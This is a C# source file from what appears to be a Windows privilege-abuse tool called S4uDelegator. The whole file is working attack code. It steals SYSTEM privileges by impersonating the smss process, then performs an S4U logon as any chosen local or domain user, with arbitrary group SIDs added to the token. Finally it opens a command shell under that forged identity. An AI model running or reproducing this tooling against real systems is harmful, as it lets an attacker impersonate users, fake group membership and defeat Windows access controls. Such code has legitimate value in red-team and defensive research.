using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Text.RegularExpressions;
using S4uDelegator.Interop;

namespace S4uDelegator.Library
{
    internal class Modules
    {
        public static bool GetShell(
            string domain,
            string username,
            string sid,
            string[] extraSids)
        {
            bool isImpersonated;
            List<string> groupSids;
            var requiredPrivs = new List<string>
            {
                Win32Consts.SE_TCB_NAME,
                Win32Consts.SE_ASSIGNPRIMARYTOKEN_NAME
            };
            var status = false;

            if (string.IsNullOrEmpty(domain))
                domain = Environment.MachineName;

            if (!VerifyAccount(
                ref domain,
                ref username,
                ref sid,
                out string upn))
            {
                Console.WriteLine("[-] Invalid account is specified.");
                return false;
            }

            if (extraSids.Length > 0)
                groupSids = VerifyGroupSids(extraSids);
            else
                groupSids = new List<string>();

            if (!Utilities.EnableTokenPrivileges(
                new List<string> { Win32Consts.SE_DEBUG_NAME, Win32Consts.SE_IMPERSONATE_NAME },
                out Dictionary<string, bool> adjustedPrivs))
            {
                foreach (var priv in adjustedPrivs)
                {
                    if (!priv.Value)
                        Console.WriteLine("[-] Failed to enable {0}", priv.Key);
                }

                return false;
            }

            do
            {
                int error;
                IntPtr hImpersonationToken;
                LSA_STRING pkgName;
                TOKEN_SOURCE tokenSource;
                var hPrimaryToken = IntPtr.Zero;
                var startupInfo = new STARTUPINFO
                {
                    cb = Marshal.SizeOf(typeof(STARTUPINFO)),
                    lpDesktop = @"Winsta0\Default"
                };

                Console.WriteLine("[>] Trying to get SYSTEM.");

                isImpersonated = Utilities.ImpersonateAsSmss(requiredPrivs);

                if (!isImpersonated)
                {
                    foreach (var priv in adjustedPrivs)
                    {
                        if (!priv.Value)
                            Console.WriteLine("[-] Failed to enable {0}", priv.Key);
                    }

                    break;
                }
                else
                {
                    Console.WriteLine("[+] Got SYSTEM privileges.");
                }

                Console.WriteLine("[>] Trying to S4U logon.");

                if (string.IsNullOrEmpty(upn))
                {
                    pkgName = new LSA_STRING(Win32Consts.MSV1_0_PACKAGE_NAME);
                    tokenSource = new TOKEN_SOURCE("User32");
                    hPrimaryToken = Utilities.GetS4uLogonToken(
                        username,
                        domain,
                        in pkgName,
                        in tokenSource,
                        groupSids);
                }
                else
                {
                    pkgName = new LSA_STRING(Win32Consts.NEGOSSP_NAME_A);
                    tokenSource = new TOKEN_SOURCE("NtLmSsp");
                    hImpersonationToken = Utilities.GetS4uLogonToken(
                        username,
                        domain,
                        in pkgName,
                        in tokenSource,
                        groupSids);

                    if (hImpersonationToken == IntPtr.Zero)
                    {
                        error = Marshal.GetLastWin32Error();
                        Console.WriteLine("[-] Failed to S4U logon.");
                        Console.WriteLine("    |-> {0}", Helpers.GetWin32ErrorMessage(error, false));
                    }
                    else
                    {
                        status = NativeMethods.DuplicateTokenEx(
                            hImpersonationToken,
                            TokenAccessFlags.TOKEN_ALL_ACCESS,
                            IntPtr.Zero,
                            SECURITY_IMPERSONATION_LEVEL.Anonymous,
                            TOKEN_TYPE.TokenPrimary,
                            out hPrimaryToken);
                        NativeMethods.NtClose(hImpersonationToken);

                        if (!status)
                            hPrimaryToken = IntPtr.Zero;
                    }
                }

                if (hPrimaryToken == IntPtr.Zero)
                {
                    error = Marshal.GetLastWin32Error();
                    Console.WriteLine("[-] Failed to S4U logon.");
                    Console.WriteLine("    |-> {0}", Helpers.GetWin32ErrorMessage(error, false));
                    break;
                }
                else
                {
                    Console.WriteLine("[+] S4U logon is successful.");
                }
                
                Console.WriteLine("[>] Trying to create a token assigned process.");

                status = NativeMethods.CreateProcessAsUser(
                    hPrimaryToken,
                    null,
                    Environment.GetEnvironmentVariable("COMSPEC"),
                    IntPtr.Zero,
                    IntPtr.Zero,
                    false,
                    ProcessCreationFlags.CREATE_BREAKAWAY_FROM_JOB,
                    IntPtr.Zero,
                    Environment.CurrentDirectory,
                    in startupInfo,
                    out PROCESS_INFORMATION processInformation);
                NativeMethods.NtClose(hPrimaryToken);

                if (status)
                {
                    NativeMethods.WaitForSingleObject(processInformation.hProcess, uint.MaxValue);
                    NativeMethods.NtClose(processInformation.hThread);
                    NativeMethods.NtClose(processInformation.hProcess);
                }
                else
                {
                    error = Marshal.GetLastWin32Error();
                    Console.WriteLine("[-] Failed to create primary token.");
                    Console.WriteLine("    |-> {0}", Helpers.GetWin32ErrorMessage(error, false));
                }
            } while (false);

            if (isImpersonated)
                NativeMethods.RevertToSelf();

            Console.WriteLine("[*] Done.");

            return status;
        }


        public static bool LookupSid(
            string domain,
            string username,
            string sid)
        {
            string result;
            string accountName;

            if ((!string.IsNullOrEmpty(domain) || !string.IsNullOrEmpty(username)) &&
                !string.IsNullOrEmpty(sid))
            {
                Console.WriteLine("\n[!] Username or domain name should not be specified with SID at a time.\n");

                return false;
            }
            else if (!string.IsNullOrEmpty(domain) || !string.IsNullOrEmpty(username))
            {
                if (!string.IsNullOrEmpty(domain) && domain.Trim() == ".")
                    domain = Environment.MachineName;

                if (!string.IsNullOrEmpty(domain) && !string.IsNullOrEmpty(username))
                    accountName = string.Format("{0}\\{1}", domain, username);
                else if (!string.IsNullOrEmpty(domain))
                    accountName = domain;
                else if (!string.IsNullOrEmpty(username))
                    accountName = username;
                else
                    return false;

                result = Helpers.ConvertAccountNameToStringSid(
                    ref accountName,
                    out SID_NAME_USE peUse);

                if (!string.IsNullOrEmpty(result))
                {
                    Console.WriteLine();
                    Console.WriteLine("[*] Result:");
                    Console.WriteLine("    |-> Account Name : {0}", accountName);
                    Console.WriteLine("    |-> SID          : {0}", result);
                    Console.WriteLine("    |-> Account Type : {0}", peUse.ToString());
                    Console.WriteLine();

                    return true;
                }
                else
                {
                    Console.WriteLine("\n[*] No result.\n");

                    return false;
                }
            }
            else if (!string.IsNullOrEmpty(sid))
            {
                result = Helpers.ConvertSidStringToAccountName(
                    ref sid,
                    out SID_NAME_USE peUse);

                if (!string.IsNullOrEmpty(result))
                {
                    Console.WriteLine();
                    Console.WriteLine("[*] Result:");
                    Console.WriteLine("    |-> Account Name : {0}", result);
                    Console.WriteLine("    |-> SID          : {0}", sid);
                    Console.WriteLine("    |-> Account Type : {0}", peUse.ToString());
                    Console.WriteLine();

                    return true;
                }
                else
                {
                    Console.WriteLine("\n[*] No result.\n");

                    return false;
                }
            }
            else
            {
                Console.WriteLine("\n[!] SID, domain name or username to lookup is required.\n");

                return false;
            }
        }


        private static bool VerifyAccount(
            ref string domain,
            ref string username,
            ref string sid,
            out string upn)
        {
            SID_NAME_USE peUse;
            string computerName = Environment.MachineName;
            string currentDomain = Helpers.GetCurrentDomainName();
            string fqdn = currentDomain;
            string localSid = Helpers.ConvertAccountNameToStringSid(
                ref computerName,
                out SID_NAME_USE _);
            string domainSid;
            string accountName;
            string accountSid;
            string patternDomainSid;
            string patternLocalSid = string.Format("^{0}(-\\d+)$", localSid);
            var rgx = new Regex(patternLocalSid);
            upn = null;

            if (domain == ".")
                domain = Environment.MachineName;

            if (string.IsNullOrEmpty(currentDomain))
            {
                domainSid = null;
                patternDomainSid = null;
            }
            else
            {
                domainSid = Helpers.ConvertAccountNameToStringSid(
                    ref currentDomain,
                    out SID_NAME_USE _);
                patternDomainSid = string.Format("^{0}(-\\d+)$", domainSid);
            }

            if ((!string.IsNullOrEmpty(domain) || !string.IsNullOrEmpty(username)) &&
                !string.IsNullOrEmpty(sid))
            {
                Console.WriteLine("[!] Account name and SID should not be specified at a time.\n");

                return false;
            }

            if (string.IsNullOrEmpty(sid))
            {
                if (!string.IsNullOrEmpty(domain) && !string.IsNullOrEmpty(username))
                    accountName = string.Format("{0}\\{1}", domain, username);
                else if (!string.IsNullOrEmpty(domain))
                    accountName = domain;
                else if (!string.IsNullOrEmpty(username))
                    accountName = username;
                else
                    return false;

                accountSid = Helpers.ConvertAccountNameToStringSid(
                    ref accountName,
                    out peUse);
            }
            else
            {
                accountSid = sid;
                accountName = Helpers.ConvertSidStringToAccountName(
                    ref accountSid,
                    out peUse);
            }

            if (!string.IsNullOrEmpty(accountName) &&
                !string.IsNullOrEmpty(accountSid))
            {
                if (peUse != SID_NAME_USE.User)
                {
                    Console.WriteLine("[-] Target account should be user account.\n");

                    return false;
                }

                try
                {
                    domain = accountName.Split('\\')[0];
                    username = accountName.Split('\\')[1];
                }
                catch
                {
                    Console.WriteLine("[-] Failed to parse account name.\n");

                    return false;
                }

                Console.WriteLine("[>] Target account to S4U:");
                Console.WriteLine("    |-> Account Name        : {0}", accountName);
                Console.WriteLine("    |-> Account Sid         : {0}", accountSid);
                Console.WriteLine("    |-> Account Type        : {0}", peUse.ToString());

                if (rgx.IsMatch(accountSid))
                {
                    upn = null;
                }
                else if (!string.IsNullOrEmpty(domainSid))
                {
                    rgx = new Regex(patternDomainSid);

                    if (rgx.IsMatch(accountSid))
                    {
                        upn = string.Format("{0}@{1}", username, fqdn);
                    }
                    else
                    {
                        Console.WriteLine("[-] Target account cannot be used to S4U.\n");

                        return false;
                    }
                }
                else
                {
                    Console.WriteLine("[-] Target account cannot be used to S4U.\n");

                    return false;
                }

                Console.WriteLine("    |-> User Principal Name : {0}", string.IsNullOrEmpty(upn) ? "(NULL)" : upn);

                return true;
            }
            else
            {
                Console.WriteLine("[-] Failed to resolve target account information.\n");

                return false;
            }
        }


        private static List<string> VerifyGroupSids(string[] groupSids)
        {
            var result = new List<string>();
            string accountName;
            var filter = new Regex(@"^(s|S)(-\d+)+$");

            if (groupSids.Length > 0)
            {
                Console.WriteLine("[>] Group SID to add:");

                for (var idx = 0; idx < groupSids.Length; idx++)
                {
                    if (!filter.IsMatch(groupSids[idx]))
                        continue;
                    else if (result.Contains(groupSids[idx].ToUpper()))
                        continue;

                    accountName = Helpers.ConvertSidStringToAccountName(
                        ref groupSids[idx],
                        out SID_NAME_USE peUse);

                    if (string.IsNullOrEmpty(accountName))
                    {
                        Console.WriteLine(
                            "    |-> [IGNORED] Failed to resolve {0}.",
                            groupSids[idx].ToUpper());
                    }
                    else if ((peUse == SID_NAME_USE.Group) ||
                        (peUse == SID_NAME_USE.WellKnownGroup))
                    {
                        Console.WriteLine(
                            "    |-> [VALID] {0} (SID : {1}) will be added.",
                            accountName,
                            groupSids[idx].ToUpper());
                        result.Add(groupSids[idx].ToUpper());
                    }
                    else
                    {
                        Console.WriteLine(
                            "    |-> [IGNORED] {0} (SID : {1}) is not group.",
                            accountName,
                            groupSids[idx].ToUpper());
                    }
                }
            }

            return result;
        }
    }
}
